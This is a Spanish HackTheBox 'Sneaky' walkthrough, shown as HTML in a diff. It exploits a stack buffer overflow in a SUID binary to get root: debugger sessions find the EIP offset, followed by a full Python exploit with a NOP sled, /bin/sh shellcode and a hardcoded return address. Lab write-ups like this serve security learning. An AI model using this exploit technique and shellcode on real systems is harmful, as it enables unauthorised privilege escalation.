+<span class="s2">" /usr/local/bin/chal		BOF Buffer Over Flow"</span>
+/usr/sbin/uuidd
+/usr/sbin/pppd
+/usr/bin/at
+/usr/bin/pkexec
+/usr/bin/traceroute6.iputils
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/mtr
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+</code></pre></div></div>
+<p>Procedemos a ejecutar el binario   “chal” y nos devuelve un segmentation Fault (Buffer over Flow)
+Ahora la idea es ver que ocurre por detras en este programita para poder abusar de el mediante un Buffer Over Flow
+Para ello vamos a convertirnos el codigo del binario en base64 para traernoslo a nuestra maquina y poder pasarle utilidades como “ltrace | strace | strings”</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thrasivoulos@Sneaky:/usr/bin<span class="nv">$ </span>which chal | xargs <span class="nb">base64</span> <span class="nt">-w0</span>
+f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAIIMECDQAAABUEQAAAAAAADQAIAAJACgAHgAbAAYAAAA0AAAANIAECDSABAggAQAAIAEAAAUAAAAEA.. ETC ETC ... binario en BASE64 ... ETC ETC
+</code></pre></div></div>
+<p>Una vez copiado el base64 procedemos en nuestra maquina:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"echo “base64 de chall” | base64 -d &gt;&gt; chall"</span>
+<span class="s2">"chmod +x chall"</span>
+<span class="s2">"ltrace ./chall"</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ltrace ./chall                                                                                                                                   139 ⨯</span>
+__libc_start_main<span class="o">(</span>0x804841d, 1, 0xffcc0374, 0x8048450 &lt;unfinished ...&gt;
+strcpy<span class="o">(</span>0xffcc0162, nil &lt;no <span class="k">return</span> ...&gt;
+<span class="nt">---</span> SIGSEGV <span class="o">(</span>Segmentation fault<span class="o">)</span> <span class="nt">---</span>
++++ killed by SIGSEGV +++
+</code></pre></div></div>
+<p>Cuando se usa este funcion <code class="language-plaintext highlighter-rouge">strcpy</code> vemos que se puede abusar de ella (Es peligrosa, y potencialmente vulnerable)</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ./chall $(python -c 'print "A"*500') </span>
+zsh: segmentation fault  ./chall <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print "A"*500'</span><span class="si">)</span>
+</code></pre></div></div>
+<p>Aqui le pasamos 500 <code class="language-plaintext highlighter-rouge">A</code> y el programa peta.</p>
+
+<p>Para instalar <code class="language-plaintext highlighter-rouge">gdb-peda</code> tiramos de <code class="language-plaintext highlighter-rouge">“apt”</code>
+Posteriormente tendriamos que instalar “peda” desde https://github.com/longld/peda
+<code class="language-plaintext highlighter-rouge">SEGUIR LOS PASOS DE PEDA</code>
+Usamos gdb para pasarle el payload de 500 “A” y analizar la pila a bajo nivel con <code class="language-plaintext highlighter-rouge">gdb</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># gdb ./chall                                                                                                                                      139 ⨯</span>
+GNU gdb <span class="o">(</span>Debian 10.1-1.7<span class="o">)</span> 10.1.90.20210103-git
+Copyright <span class="o">(</span>C<span class="o">)</span> 2021 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type <span class="s2">"show copying"</span> and <span class="s2">"show warranty"</span> <span class="k">for </span>details.
+This GDB was configured as <span class="s2">"x86_64-linux-gnu"</span><span class="nb">.</span>
+Type <span class="s2">"show configuration"</span> <span class="k">for </span>configuration details.
+For bug reporting instructions, please see:
+&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+
+For <span class="nb">help</span>, <span class="nb">type</span> <span class="s2">"help"</span><span class="nb">.</span>
+Type <span class="s2">"apropos word"</span> to search <span class="k">for </span>commands related to <span class="s2">"word"</span>...
+Reading symbols from ./chall...
+<span class="o">(</span>No debugging symbols found <span class="k">in</span> ./chall<span class="o">)</span>
+<span class="o">(</span>gdb<span class="o">)</span>  r <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print "A"*500'</span><span class="si">)</span> 
+Starting program: /home/pro/Escritorio/HTB/Sneaky/exploits/chall <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print "A"*500'</span><span class="si">)</span>
+
+Program received signal SIGSEGV, Segmentation fault.
+<span class="s2">"0x41414141"</span> <span class="k">in</span> ?? <span class="o">()</span>
+<span class="o">(</span>gdb<span class="o">)</span> 
+</code></pre></div></div>
+<p>Tenemos el EIP Sobrescrito con nuestras <code class="language-plaintext highlighter-rouge">AAA'S</code>
+Ahora cuantas <code class="language-plaintext highlighter-rouge">AAA..</code> tenemos que poner hasta llegar al EIP?
+Eso lo calculamos de la siguiente forma:</p>
+
+<p>Con <code class="language-plaintext highlighter-rouge">pattern_create 500</code>como comando creamos unos caracteres especiales para averiguar cuantas AAAA.. tenemos que poner hasta llegar al <code class="language-plaintext highlighter-rouge">EIP</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#gdb-peda$ pattern_create 500</span>
+<span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAAp
+AATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%
+MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2A
+sHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'</span>
+</code></pre></div></div>
+<p>Ahora le pasamos al programa estos caracteres especialmente creados por Pattern_create para detectar cuando se esta sobrescribiento el EIP</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAm</span>
+AARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="nv">$A</span>%nA%CA%-A%<span class="o">(</span>A%DA%<span class="p">;</span>A%<span class="o">)</span>A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%
+LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs<span class="nv">$AsnAsCAs</span><span class="nt">-As</span><span class="o">(</span>AsDAs<span class="p">;</span>As<span class="o">)</span>AsEAsaAs0AsFAsbAs1AsGA
+scAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A<span class="s1">'
+
+Starting program: /home/pro/Escritorio/HTB/Sneaky/exploits/chall '</span>AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="nv">$A</span>%nA%CA%-A%<span class="o">(</span>A%DA%<span class="p">;</span>A%<span class="o">)</span>A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs<span class="nv">$AsnAsCAs</span><span class="nt">-As</span><span class="o">(</span>AsDAs<span class="p">;</span>As<span class="o">)</span>AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A<span class="s1">'
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x0 
+ECX: 0xffffd730 --&gt; 0x413673 ('</span>s6A<span class="s1">')
+EDX: 0xffffd3a3 --&gt; 0x413673 ('</span>s6A<span class="s1">')
+ESI: 0xf7fa9000 --&gt; 0x1e4d6c 
+EDI: 0xf7fa9000 --&gt; 0x1e4d6c 
+EBP: 0x41712541 ('</span>A%qA<span class="s1">')
+ESP: 0xffffd320 ("rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
+EIP: 0x25415525 ('</span>%UA%<span class="s1">')
+EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x25415525
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd320 ("rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
+0004| 0xffffd324 ("A%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
+0008| 0xffffd328 ("%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
+0012| 0xffffd32c ("uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
+0016| 0xffffd330 ("A%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
+0020| 0xffffd334 ("%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
+0024| 0xffffd338 ("wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
+0028| 0xffffd33c ("A%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+"0x25415525" in ?? ()
+</span></code></pre></div></div>
+<p>Ya tenemos el <code class="language-plaintext highlighter-rouge">Offset 0x25415525</code>, asique procedemos a usar <code class="language-plaintext highlighter-rouge">pattern_offset</code> para averiguar el numero de caracteres en Hexadecimal hasta sobrescribir el <code class="language-plaintext highlighter-rouge">EIP</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># gdb-peda$ pattern_offset 0x25415525</span>
+625038629 found at offset: <span class="s2">"362"</span>
+</code></pre></div></div>
+<p>Ahora vamos a verificar que tenemos el control del EIP para luego pasarle una direccion que apunte a un poco antes de nuestro <code class="language-plaintext highlighter-rouge">SHELLCODE</code>. 
+Para ello vamos a ejecutar el siguiente comando:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>r <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print "A"*362 + "B"*4'</span><span class="si">)</span>
+Starting program: /home/pro/Escritorio/HTB/Sneaky/exploits/chall <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print "A"*362 + "B"*4'</span><span class="si">)</span>
+
+Program received signal SIGSEGV, Segmentation fault.
+<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
+EAX: 0x0 
+EBX: 0x0 
+ECX: 0xffffd730 <span class="nt">--</span><span class="o">&gt;</span> 0x424242 <span class="o">(</span><span class="s1">'BBB'</span><span class="o">)</span>
+EDX: 0xffffd39d <span class="nt">--</span><span class="o">&gt;</span> 0x424242 <span class="o">(</span><span class="s1">'BBB'</span><span class="o">)</span>
+ESI: 0xf7fa9000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c 
+EDI: 0xf7fa9000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c <span class="s2">"
+EBP: 0x41414141 ('AAAA')"</span>
+ESP: 0xffffd3a0 <span class="nt">--</span><span class="o">&gt;</span> 0x0 <span class="s2">"
+EIP: 0x42424242 ('BBBB')    "</span>
+EFLAGS: 0x10202 <span class="o">(</span>carry parity adjust zero sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
+
+<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
+Invalid <span class="nv">$PC</span> address: 0x42424242
+
+<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
+0000| 0xffffd3a0 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0004| 0xffffd3a4 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd444 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd596 <span class="o">(</span><span class="s2">"/home/pro/Escritorio/HTB/Sneaky/exploits/chall"</span><span class="o">)</span>
+0008| 0xffffd3a8 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd450 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd734 <span class="o">(</span><span class="s2">"COLORTERM=truecolor"</span><span class="o">)</span>
+0012| 0xffffd3ac <span class="nt">--</span><span class="o">&gt;</span> 0xffffd3d4 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0016| 0xffffd3b0 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd3e4 <span class="nt">--</span><span class="o">&gt;</span> 0xbaa14230 
+0020| 0xffffd3b4 <span class="nt">--</span><span class="o">&gt;</span> 0xf7ffdb40 <span class="nt">--</span><span class="o">&gt;</span> 0xf7ffdae0 <span class="nt">--</span><span class="o">&gt;</span> 0xf7fca3e0 <span class="nt">--</span><span class="o">&gt;</span> 0xf7ffd980 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0024| 0xffffd3b8 <span class="nt">--</span><span class="o">&gt;</span> 0xf7fca410 <span class="nt">--</span><span class="o">&gt;</span> 0x804825e <span class="o">(</span><span class="s2">"GLIBC_2.0"</span><span class="o">)</span>
+0028| 0xffffd3bc <span class="nt">--</span><span class="o">&gt;</span> 0xf7fa9000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c 
+<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
+
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+<span class="s2">"0x42424242"</span> <span class="k">in</span> ?? <span class="o">()</span>
+</code></pre></div></div>
+<p>Perfecto como se aprecia Ya tenemos el <code class="language-plaintext highlighter-rouge">EBP</code> sobrescrito con <code class="language-plaintext highlighter-rouge">AAAA</code>, pero controlamos el <code class="language-plaintext highlighter-rouge">EIP</code> con nuestras <code class="language-plaintext highlighter-rouge">BBBB</code></p>
+
+<p>Usamos : “ i r ”
+Para obtener informacion de los registros:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>i r
+eax            0x0                 0x0
+ecx            0xffffd730          0xffffd730
+edx            0xffffd39d          0xffffd39d
+ebx            0x0                 0x0
+esp            0xffffd3a0          0xffffd3a0
+<span class="s2">"ebp            0x41414141          0x41414141"</span> AAAA
+esi            0xf7fa9000          0xf7fa9000
+edi            0xf7fa9000          0xf7fa9000
+<span class="s2">"eip            0x42424242          0x42424242"</span> BBBB
+eflags         0x10202             <span class="o">[</span> IF RF <span class="o">]</span>
+cs             0x23                0x23
+ss             0x2b                0x2b
+ds             0x2b                0x2b
+es             0x2b                0x2b
+fs             0x0                 0x0
+gs             0x63                0x63
+</code></pre></div></div>
+<p>AQUI YA TENEMOS EL CONTROL DEL EIP 
+Enumeramos el sistema</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thrasivoulos@Sneaky:/<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
+Linux Sneaky 4.4.0-75-generic <span class="c">#96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686 athlon i686 GNU/Linux</span>
+</code></pre></div></div>
+<p>AHora vamos a buscar nuestro <code class="language-plaintext highlighter-rouge">shellcode</code> para que indicandole la direccion en el <code class="language-plaintext highlighter-rouge">EIP</code> podamos introducir nuestro shellcode como la siguiente intruccion en la pila a ejecutar.</p>
+
+<p>SHELLCODE PARA LINUX x86 (32BITS) Buscamos x <code class="language-plaintext highlighter-rouge">Jean Pascall</code> para lanzarse una <code class="language-plaintext highlighter-rouge">/bin/sh</code>
+http://shell-storm.org/shellcode/files/shellcode-811.php					====== 			/bin/sh</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>char shellcode[] <span class="o">=</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73"</span>
+                   			<span class="s2">"</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89"</span>
+                   			<span class="s2">"</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b"</span>
+                   			<span class="s2">"</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span><span class="p">;</span>
+</code></pre></div></div>
+<p>Como veiamos que el binario <code class="language-plaintext highlighter-rouge">"chal"</code> es <code class="language-plaintext highlighter-rouge">SUID y SUIG</code> y como nosotros podemos ejecutarlo, con que nos lance una shell ya lo seriamos <code class="language-plaintext highlighter-rouge">root</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thrasivoulos@Sneaky:/<span class="nv">$ </span>which chal | xargs <span class="nb">ls</span> <span class="nt">-l</span>
+<span class="nt">-rwsrwsr-x</span> 1 root root 7301 May  4  2017 /usr/local/bin/chal
+</code></pre></div></div>
+<p>PERO y si la maquina tiene habilitada la opcion ARSL(que aletoriza algunas de las direciones de la memoria)
+Forma de Comprobarlo:
+Nos fijamos en el output de los comandos aqui abajo y repetimos a ver si son estaticos o dinamicos.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thrasivoulos@Sneaky:/usr/bin<span class="nv">$ </span>which chal | xargs ldd
+        linux-gate.so.1 <span class="o">=&gt;</span>  <span class="o">(</span>0xb7ffe000<span class="o">)</span>
+        libc.so.6 <span class="o">=&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xb7e44000<span class="o">)</span>
+        /lib/ld-linux.so.2 <span class="o">(</span>0x80000000<span class="o">)</span>
+thrasivoulos@Sneaky:/usr/bin<span class="nv">$ </span>which chal | xargs ldd
+        linux-gate.so.1 <span class="o">=&gt;</span>  <span class="o">(</span>0xb7ffe000<span class="o">)</span>
+        libc.so.6 <span class="o">=&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xb7e44000<span class="o">)</span>
+        /lib/ld-linux.so.2 <span class="o">(</span>0x80000000<span class="o">)</span>
+thrasivoulos@Sneaky:/usr/bin<span class="nv">$ </span>which chal | xargs ldd
+        linux-gate.so.1 <span class="o">=&gt;</span>  <span class="o">(</span>0xb7ffe000<span class="o">)</span>
+        libc.so.6 <span class="o">=&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xb7e44000<span class="o">)</span>
+        /lib/ld-linux.so.2 <span class="o">(</span>0x80000000<span class="o">)</span>
+</code></pre></div></div>
+<p>Se ve claro que son ESTATICOS  por lo que PERFECTO.
+Otra Forma:</p>
+
+<p><code class="language-plaintext highlighter-rouge">Siempre que devuelva un 0 es que el asrl no esta activado.</code>
+<code class="language-plaintext highlighter-rouge">Siempre que devuelva un 1 es que el asrl si esta activado.</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thrasivoulos@Sneaky:/usr/bin<span class="nv">$ </span><span class="s2">"cat /proc/sys/kernel/randomize_va_space "</span>
+0
+</code></pre></div></div>
+<p>No esta Activado
+Ahora a NIVEL DE PROTECCIONES DEL BINARIO ¿HAY ALGUNA PROTECCION?</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : Partial
+</code></pre></div></div>
+<p>Nada no tiene nada activado, nos vamos a un directorio en la maquina victima que tengamos escritura y procedemos con nuestro script en python:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">exploit</span><span class="p">.</span><span class="n">py</span>
+
+<span class="c1">#Para poner la direccion del EIP en Litle Indian
+</span><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+
+
+<span class="k">def</span> <span class="nf">bufferOverFlow</span><span class="p">():</span>
+
+        <span class="n">offset</span> <span class="o">=</span> <span class="mi">362</span>    <span class="c1"># el numero hasta antes de sobrescribir el EIP
+</span>        <span class="n">junk</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="n">offset</span> <span class="c1"># basura
+</span>        <span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="s">"</span>
+<span class="c1"># NOPS (NO Operation CODE Caracteres) Los calculamos Siempre: Multiplicando por offset y restandole shellcode
+</span>        <span class="n">nops</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+ 
+ <span class="c1"># aqui seguimos sobrescribiendo el EIP con AAAA
+</span> <span class="c1">#      payload = nops + shellcode + "\x41\x41\x41\x41"      primer prueba payload para comprobar que el exploit funciona correctamente
+</span>        <span class="n">payload</span> <span class="o">=</span> <span class="n">nops</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span> <span class="s">"&lt;I"</span><span class="p">,</span> <span class="mh">0xbffff78c</span><span class="p">)</span>  <span class="c1"># Segundo payload, para apuntar un poco mas atras de nuestro shellcode en los NOPS
+</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+
+        <span class="n">bufferOverFlow</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Aqui procedemos a hacerle la primera prueba a nuestro exploit.py con el primer payload del exploit.py</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> r <span class="si">$(</span>python exploit.py<span class="si">)</span>
+Starting program: /usr/local/bin/chal <span class="si">$(</span>python exploit.py<span class="si">)</span>
+
+Program received signal SIGSEGV, Segmentation fault.
+<span class="s2">"0x41414141"</span> <span class="k">in</span> ?? <span class="o">()</span>
+</code></pre></div></div>
+<p>Vemos que <code class="language-plaintext highlighter-rouge">seguimos teniendo el contro del EIP</code>, Perfecto!</p>
+
+<p>Ahora vamos a listar la pila y ver donde esta nuestro SHELLCODE PARA pillar una direccion desde mas atras, en los <code class="language-plaintext highlighter-rouge">NOPS</code> 
+y que cuando se ejecute el <code class="language-plaintext highlighter-rouge">EIP</code> + la direccion antes de nuestro <code class="language-plaintext highlighter-rouge">SHELLCODE</code> se ejecute la <code class="language-plaintext highlighter-rouge">/bin/sh</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> x/100x <span class="nv">$esp</span><span class="nt">-100</span>
+0xbffff50c:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff51c:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff52c:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff53c:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff54c:     0x90909090<span class="s2">"     0x6850c031      0x68732f2f      0x69622f68
+0xbffff55c:     0x89e3896e      0xb0c289c1      0x3180cd0b      0x80cd40c0			nuestro shellcode en litle indian"</span>
+0xbffff56c:     0x41414141      0x00000000      0xbffff604      0xbffff610
+0xbffff57c:     0xb7feccca      0x00000002      0xbffff604      0xbffff5a4
+0xbffff58c:     0x0804a014      0x0804821c      0xb7fce000      0x00000000
+0xbffff59c:     0x00000000      0x00000000      0x36fef84f      0x0e617c5f
+0xbffff5ac:     0x00000000      0x00000000      0x00000000      0x00000002
+0xbffff5bc:     0x08048320      0x00000000      0xb7ff24c0      0xb7e3ba09
+0xbffff5cc:     0xb7fff000      0x00000002      0x08048320      0x00000000
+0xbffff5dc:     0x08048341      0x0804841d      0x00000002      0xbffff604
+0xbffff5ec:     0x08048450      0x080484c0      0xb7fed160      0xbffff5fc
+0xbffff5fc:     0x0000001c      0x00000002      0xbffff72f      0xbffff743
+0xbffff60c:     0x00000000      0xbffff8b2      0xbffff8c3      0xbffff8d3
+0xbffff61c:     0xbffff8e7      0xbffff90d      0xbffff920      0xbffff932
+0xbffff62c:     0xbffffe53      0xbffffe5f      0xbffffebd      0xbffffed9
+0xbffff63c:     0xbffffee8      0xbffffef1      0xbfffff02      0xbfffff0b
+0xbffff64c:     0xbfffff23      0xbfffff2b      0xbfffff40      0xbfffff87
+0xbffff65c:     0xbfffffa7      0xbfffffc6      0x00000000      0x00000020
+0xbffff66c:     0xb7fdccf0      0x00000021      0xb7fdc000      0x00000010
+0xbffff67c:     0x078bfbff      0x00000006      0x00001000      0x00000011
+0xbffff68c:     0x00000064      0x00000003      0x08048034      0x00000004
+</code></pre></div></div>
+<p>Ahora viendo mas o menos por donde queda nuestro <code class="language-plaintext highlighter-rouge">shellcode</code> procederiamos a apuntar a un poco mas atras en una direccion en la que esten los <code class="language-plaintext highlighter-rouge">NOPS</code> 
+por si el contenido de los caracteres se desplaza por cualquier causa y que luego nos ejecute nuestro <code class="language-plaintext highlighter-rouge">shellcode</code> como <code class="language-plaintext highlighter-rouge">EIP</code>(Siguiente Intruccion a Reralizar)</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thrasivoulos@Sneaky:/tmp<span class="nv">$ </span>chal <span class="si">$(</span>python exploit.py<span class="si">)</span> 
+<span class="c"># whoami</span>
+root
+</code></pre></div></div>
